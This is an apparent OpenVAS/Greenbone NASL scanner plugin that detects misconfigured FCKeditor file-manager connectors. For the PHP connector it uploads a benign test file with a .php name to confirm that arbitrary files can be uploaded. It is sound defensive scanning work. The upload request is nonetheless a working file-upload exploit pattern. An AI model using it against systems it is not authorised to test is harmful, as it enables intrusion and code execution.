CPE = "cpe:/a:fckeditor:fckeditor";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.111022" );
	script_version( "2021-06-17T07:43:22+0000" );
	script_tag( name: "last_modification", value: "2021-06-17 07:43:22 +0000 (Thu, 17 Jun 2021)" );
	script_tag( name: "creation_date", value: "2015-07-17 13:24:40 +0200 (Fri, 17 Jul 2015)" );
	script_tag( name: "cvss_base", value: "4.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:S/C:P/I:P/A:P" );
	script_name( "FCKeditor Connectors Arbitrary File Upload Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 SCHUTZWERK GmbH" );
	script_dependencies( "gb_fckeditor_http_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "fckeditor/http/detected" );
	script_tag( name: "summary", value: "Web applications providing wrong configured FCKeditor connectors
  might be prone to an arbitrary-file-upload vulnerability." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to upload arbitrary files to
  the affected system. This can result in arbitrary code execution within the context of the
  vulnerable application." );
	script_tag( name: "solution", value: "Check the config of this connector and make sure that no
  arbitrary file extensions are allowed for uploading." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
asp_files = make_list( "/editor/filemanager/connectors/asp/connector.asp?Command=GetFolders&Type=File&CurrentFolder=%2F",
	 "/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFolders&Type=File&CurrentFolder=%2F" );
php_files = make_list( "/editor/filemanager/connectors/php/connector.php?Command=GetFolders&Type=File&CurrentFolder=%2F" );
files = make_list( "/editor/filemanager/connectors/cfm/connector.cfm?Command=GetFolders&Type=File&CurrentFolder=%2F",
	 "/editor/filemanager/connectors/lasso/connector.lasso?Command=GetFolders&Type=File&CurrentFolder=%2F",
	 "/editor/filemanager/connectors/perl/connector.cgi?Command=GetFolders&Type=File&CurrentFolder=%2F",
	 "/editor/filemanager/connectors/py/connector.py?Command=GetFolders&Type=File&CurrentFolder=%2F" );
if( http_can_host_asp( port: port ) && http_can_host_php( port: port ) ){
	files = make_list( files,
		 asp_files,
		 php_files );
}
else {
	if( http_can_host_asp( port: port ) ){
		files = make_list( files,
			 asp_files );
	}
	else {
		if(http_can_host_php( port: port )){
			files = make_list( files,
				 php_files );
		}
	}
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
for file in files {
	url = dir + file;
	if( ContainsString( url, "connector.php" ) ){
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( data: req, port: port, bodyonly: TRUE );
		if(ContainsString( res, "<Connector command=\"GetFolders\" resourceType=\"File\">" )){
			upload_file = "upload-test-delete-me-" + rand() + ".php";
			url = dir + "/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2F";
			req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n", "Accept-Encoding: gzip, deflate\\r\\n", "Connection: keep-alive\\r\\n", "Referer: http://", host, dir, "/editor/filemanager/connectors/test.html\\r\\n", "Content-Type: multipart/form-data; boundary=---------------------------1179981022663023650735134601\\r\\n", "Content-Length: 275\\r\\n", "\\r\\n", "-----------------------------1179981022663023650735134601\\r\\n", "Content-Disposition: form-data; name=\"NewFile\"; filename=\"", upload_file, "\"\r\n", "Content-Type: text/plain\\r\\n", "\\r\\n", "Upload-Test\\r\\n", "-----------------------------1179981022663023650735134601--\\r\\n", "\\r\\n\\r\\n" );
			res = http_keepalive_send_recv( data: req, port: port, bodyonly: TRUE );
			if( ContainsString( res, "OnUploadCompleted(0" ) && ContainsString( res, upload_file ) ){
				file_location = eregmatch( pattern: "0,\"(.*)" + upload_file + "\",\"" + upload_file + "\"", string: res );
				url = file_location[1] + upload_file;
				req2 = http_get( item: url, port: port );
				res2 = http_keepalive_send_recv( data: req2, port: port, bodyonly: TRUE );
				if( ContainsString( res, "Upload-Test" ) ){
					report = "It was possible to upload the file:\n\n" + file_location[1] + upload_file + "\n\nby using the connector:\n\n" + dir + file + "\n\nPlease delete this uploaded file.";
					security_message( port: port, data: report );
					exit( 0 );
				}
				else {
					report = "It was possible to detect a connector at:\n\n" + dir + file;
					security_message( port: port, data: report );
					exit( 0 );
				}
			}
			else {
				report = "It was possible to detect a connector at:\n\n" + dir + file;
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
	else {
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( data: req, port: port, bodyonly: TRUE );
		if(ContainsString( res, "<Connector command=\"GetFolders\" resourceType=\"File\">" )){
			report = "It was possible to detect a connector at:\n\n" + dir + file;
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

